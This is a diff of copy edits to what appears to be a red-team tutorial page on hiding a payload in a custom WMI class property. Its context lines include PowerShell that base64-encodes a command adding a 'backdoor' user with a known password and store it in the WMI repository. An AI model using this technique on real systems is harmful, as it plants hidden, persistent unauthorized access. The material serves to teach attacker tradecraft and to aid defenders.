@@ -26,7 +26,7 @@ IsInstance    : False
 IsSingleton   : False
 ```
 
-We can see the `Evil` class' properties:
+We can see the `Evil` class properties:
 
 ```csharp
 ([wmiclass] 'Evil').Properties
@@ -40,13 +40,13 @@ Origin     : Evil
 Qualifiers : {CIMTYPE}
 ```
 
-Checking WMI explorer shows the new `Evil` class has been created under the `root\cimv2` namepace - note the `EvilProperty` can also be observed:
+Checking WMI Explorer shows the new `Evil` class has been created under the `root\cimv2` namepace - note the `EvilProperty` can also be observed:
 
 ![](../../.gitbook/assets/wmi-data-storage-newclass.png)
 
 ### Storing Payload
 
-For storing the payload inside the EvilPropertty, let's create a powershell base64 encoded command to add a backdoor user with credentials `backdoor:backdoor`:
+For storing the payload inside the `EvilProperty`, let's create a base64 encoded powershell command that adds a backdoor user with credentials `backdoor:backdoor`:
 
 ```csharp
 $command = "cmd '/c net user add backdoor backdoor /add'"
@@ -62,7 +62,7 @@ Updating `EvilProperty` attribute to store `$encodedCommand`:
 $evilClass.Properties.Add('EvilProperty', $encodedCommand)
 ```
 
-Below is the same as above, just in screenshots:
+Below is the same as above, just in a screenshot:
 
 ![](../../.gitbook/assets/wim-setting-payload.png)
 
@@ -84,11 +84,11 @@ If we commit the `$evilClass` with its `.Put()` method, our payload will get sto
 
 Using the WMI Explorer, we can inspect the class' definition which is stored in`%SystemRoot%\System32\wbem\Repository\OBJECTS.DATA` 
 
-The file contains all the classes and other relevant information about those classes. In our case, we can see the `EvilProperty` with our malicious payload:
+The file contains all the classes and other relevant information about those classes. In our case, we can see the `EvilProperty` with our malicious payload inside:
 
 ![](../../.gitbook/assets/wmi-evil-mof.png)
 
-Inspecting the OBJECTS.DATA with a hex editor, it is possible \(although not very practicle\) to find the same data - note that the screenshot is referring to the state of the Evil class at the very beginning of its creation as this is when I took the screenshot:
+When inspecting the OBJECTS.DATA with a hex editor, it is possible \(although not very practical nor user friendly\) to find the same data - note that the screenshot is referring to the state of the Evil class at the very beginning of its creation as this is when I took the screenshot:
 
 ![](../../.gitbook/assets/wmi-objects-data.png)
 
